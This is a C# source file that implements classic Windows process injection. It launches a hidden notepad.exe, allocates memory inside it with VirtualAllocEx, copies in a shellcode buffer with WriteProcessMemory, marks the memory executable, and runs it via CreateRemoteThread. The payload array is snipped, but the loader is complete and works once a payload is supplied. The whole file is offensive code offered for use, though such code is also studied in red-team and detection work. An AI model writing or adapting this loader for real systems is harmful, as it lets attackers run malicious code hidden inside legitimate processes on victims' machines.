using System;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            private uint cb;
            private IntPtr lpReserved;
            private IntPtr lpDesktop;
            private IntPtr lpTitle;
            private uint dwX;
            private uint dwY;
            private uint dwXSize;
            private uint dwYSize;
            private uint dwXCountChars;
            private uint dwYCountChars;
            private uint dwFillAttributes;
            private uint dwFlags;
            private ushort wShowWindow;
            private ushort cbReserved;
            private IntPtr lpReserved2;
            private IntPtr hStdInput;
            private IntPtr hStdOutput;
            private IntPtr hStdErr;
        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto,
            CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName,
            string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs,
            bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment,
            IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo,
            out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess,
            IntPtr lpAddress, uint dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        private static void Main(string[] args)
        {
            byte[] buf = { }; //{< SNIP >};

            // 1. Create the target process
            var startInfo = new STARTUPINFO();
            var procInfo = new PROCESS_INFORMATION();
            var flags = DetachedProcess | CreateNoWindow;
            CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe",
                IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero,
                IntPtr.Zero,
                ref startInfo, out procInfo);

            // 2. Allocate RW space for shellcode in target process
            var lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero,
                (uint)buf.Length, 0x3000, PageReadWrite);

            // 3. Copy shellcode to target process
            IntPtr outSize;
            WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf,
                buf.Length,
                out outSize);

            // 4. Make shellcode in target process's memory executable
            uint lpflOldProtect;
            VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)buf.Length,
                PageReadExecute, out lpflOldProtect);

            // 5. Create remote thread in target process
            var hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0,
                lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}